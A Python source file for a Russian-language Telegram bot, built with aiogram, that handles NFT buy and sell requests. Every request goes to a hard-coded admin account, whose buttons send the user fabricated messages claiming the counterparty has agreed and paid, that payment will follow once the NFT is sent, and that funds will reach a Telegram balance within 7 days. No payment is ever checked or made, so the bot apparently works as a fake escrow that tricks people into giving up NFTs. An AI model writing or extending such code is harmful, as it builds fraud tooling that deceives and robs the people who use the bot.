import asyncio
import logging
import os
from aiogram import Bot, Dispatcher, F
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton

# ================== НАСТРОЙКИ ==================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 8921066517
# ===============================================

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# Здесь храним зарегистрированных пользователей (username → user_id)
# Внимание: при перезапуске бота этот список сбрасывается
registered_users = {}


class Form(StatesGroup):
    role = State()
    my_username = State()
    other_username = State()
    nft_name = State()
    price = State()
    confirm = State()


@dp.message(CommandStart())
async def start(message: Message, state: FSMContext):
    await state.clear()

    # Регистрируем пользователя
    if message.from_user.username:
        registered_users[message.from_user.username.lower()] = message.from_user.id

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🛒 Продать NFT", callback_data="role_sell")],
        [InlineKeyboardButton(text="💰 Купить NFT", callback_data="role_buy")]
    ])

    await message.answer(
        "<b>Добро пожаловать!</b>\n\n"
        "Выбери, что хочешь сделать:",
        reply_markup=kb,
        parse_mode="HTML"
    )


@dp.callback_query(F.data.in_({"role_sell", "role_buy"}))
async def choose_role(callback: CallbackQuery, state: FSMContext):
    role = "sell" if callback.data == "role_sell" else "buy"
    await state.update_data(role=role)

    action = "продать" if role == "sell" else "купить"

    await callback.message.edit_text(
        f"Ты хочешь <b>{action}</b> NFT.\n\n"
        f"Отправь <b>свой юзернейм</b>:\n"
        f"Например: @username",
        parse_mode="HTML"
    )
    await state.set_state(Form.my_username)
    await callback.answer()


@dp.message(Form.my_username)
async def process_my_username(message: Message, state: FSMContext):
    await state.update_data(my_username=message.text.strip())
    data = await state.get_data()

    other = "покупателя" if data["role"] == "sell" else "продавца"

    await message.answer(
        f"Теперь напиши <b>юзернейм {other}</b>:\n"
        f"Например: @username",
        parse_mode="HTML"
    )
    await state.set_state(Form.other_username)


@dp.message(Form.other_username)
async def process_other_username(message: Message, state: FSMContext):
    await state.update_data(other_username=message.text.strip())
    await message.answer(
        "Теперь напиши <b>название NFT</b>:",
        parse_mode="HTML"
    )
    await state.set_state(Form.nft_name)


@dp.message(Form.nft_name)
async def process_nft_name(message: Message, state: FSMContext):
    await state.update_data(nft_name=message.text.strip())
    await message.answer(
        "Теперь укажи <b>цену</b> (например: 150 TON):",
        parse_mode="HTML"
    )
    await state.set_state(Form.price)


@dp.message(Form.price)
async def process_price(message: Message, state: FSMContext):
    await state.update_data(price=message.text.strip())
    data = await state.get_data()

    role_text = "Продажа" if data["role"] == "sell" else "Покупка"

    text = (
        f"<b>Проверь заявку ({role_text}):</b>\n\n"
        f"Твой юзернейм: <code>{data['my_username']}</code>\n"
        f"Юзернейм второй стороны: <code>{data['other_username']}</code>\n"
        f"Название NFT: <b>{data['nft_name']}</b>\n"
        f"Цена: <b>{data['price']}</b>\n\n"
        f"Всё верно?"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Отправить", callback_data="confirm_yes"),
            InlineKeyboardButton(text="❌ Отменить", callback_data="confirm_no")
        ]
    ])
    await message.answer(text, reply_markup=kb, parse_mode="HTML")
    await state.set_state(Form.confirm)


@dp.callback_query(Form.confirm, F.data == "confirm_yes")
async def confirm_yes(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    user = callback.from_user

    role_text = "продажу" if data["role"] == "sell" else "покупку"
    other_username = data["other_username"].lstrip("@").lower()

    # Текст заявки
    deal_text = (
        f"<b>Новая заявка на {role_text} NFT</b>\n\n"
        f"От: {user.full_name} (@{user.username or 'нет'})\n"
        f"ID: <code>{user.id}</code>\n\n"
        f"Юзернейм отправителя: <code>{data['my_username']}</code>\n"
        f"Юзернейм второй стороны: <code>{data['other_username']}</code>\n"
        f"Название NFT: <b>{data['nft_name']}</b>\n"
        f"Цена: <b>{data['price']}</b>"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Согласиться", callback_data=f"accept:{user.id}"),
            InlineKeyboardButton(text="❌ Отказаться", callback_data=f"reject:{user.id}")
        ]
    ])

    # Отправляем админу всегда
    await bot.send_message(ADMIN_ID, deal_text, reply_markup=kb, parse_mode="HTML")

    # Пытаемся отправить второй стороне
    other_id = registered_users.get(other_username)
    if other_id:
        try:
            await bot.send_message(other_id, deal_text, reply_markup=kb, parse_mode="HTML")
            status = "Заявка отправлена второй стороне."
        except Exception:
            status = "Заявка не отправлена (вторая сторона недоступна)."
    else:
        status = (
            "Заявка не отправилась.\n"
            "Вторая сторона ещё не запускала бота, поэтому ей заявка не пришла."
        )

    await callback.message.edit_text(f"✅ {status}")
    await state.clear()
    await callback.answer()


@dp.callback_query(Form.confirm, F.data == "confirm_no")
async def confirm_no(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("Заявка отменена.")
    await state.clear()
    await callback.answer()


@dp.callback_query(F.data.startswith("accept:"))
async def accept_deal(callback: CallbackQuery):
    sender_id = int(callback.data.split(":")[1])

    await bot.send_message(
        sender_id,
        "Покупатель/продавец согласился и оплатил заказ.\n\n"
        "После отправки NFT вы получите деньги."
    )

    new_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"confirm_pay:{sender_id}")]
    ])

    await callback.message.edit_text(
        callback.message.text + "\n\n✅ <b>Ты согласился</b>\n\nНажми кнопку, чтобы подтвердить оплату:",
        reply_markup=new_kb,
        parse_mode="HTML"
    )
    await callback.answer("Уведомление отправлено")


@dp.callback_query(F.data.startswith("confirm_pay:"))
async def confirm_payment(callback: CallbackQuery):
    sender_id = int(callback.data.split(":")[1])

    await bot.send_message(
        sender_id,
        "Деньги будут пополнены на баланс Telegram в течение 7 дней."
    )

    await callback.message.edit_text(
        callback.message.text + "\n\n💰 <b>Оплата подтверждена</b>",
        parse_mode="HTML"
    )
    await callback.answer("Финальное уведомление отправлено")


@dp.callback_query(F.data.startswith("reject:"))
async def reject_deal(callback: CallbackQuery):
    sender_id = int(callback.data.split(":")[1])

    await bot.send_message(
        sender_id,
        "К сожалению, вторая сторона отказалась от вашей заявки."
    )

    await callback.message.edit_text(
        callback.message.text + "\n\n❌ <b>Ты отказался</b>",
        parse_mode="HTML"
    )
    await callback.answer("Уведомление об отказе отправлено")


async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
